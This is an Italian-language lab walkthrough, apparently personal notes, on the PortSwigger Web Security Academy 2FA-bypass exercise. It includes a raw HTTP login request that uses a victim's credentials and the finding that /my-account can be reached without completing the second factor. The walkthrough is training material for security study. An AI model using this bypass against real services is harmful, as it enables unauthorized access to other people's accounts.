
questa è la pagina iniziale

![](_attachments/Pasted%20image%2020240909213801.png)

se si clicca sul "visualizzatore di email", all'inizio si vede questo:

![](_attachments/Pasted%20image%2020240909213826.png)

logghiamoci come `wiener`

mi viene chiesto il code



![](_attachments/Pasted%20image%2020240909214027.png)

che infatti mi è arrivato via email

![](_attachments/Pasted%20image%2020240909214055.png)

inserisco dunque `1980`

e sono dentro


![](_attachments/Pasted%20image%2020240909214119.png)

provo a sostituire la mail

![](_attachments/Pasted%20image%2020240909214204.png)

ha punzionato

![](_attachments/Pasted%20image%2020240909214219.png)

quindi

primo step: `/login`

secondo step: `/login2`

l'idea è che magari, superato `/login`, io ho già il cookie e potrei cambiare la mail?

```
POST /login HTTP/2
Host: 0af6005404f59c0381398e6c00530066.web-security-academy.net
Cookie: session=wYAUeQfXc4TIkHf7kM9cyH87Fi4zER4b
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT
Upgrade-Insecure-Requests: 1
Origin: https://0af6005404f59c0381398e6c00530066.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af6005404f59c0381398e6c00530066.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=carlos&password=montoya
```


![](_attachments/Pasted%20image%2020240909215030.png)

????????????????????????????????????

no, era ancora più semplice.

superato `/login`, si può direttamente visitare `/my-account`

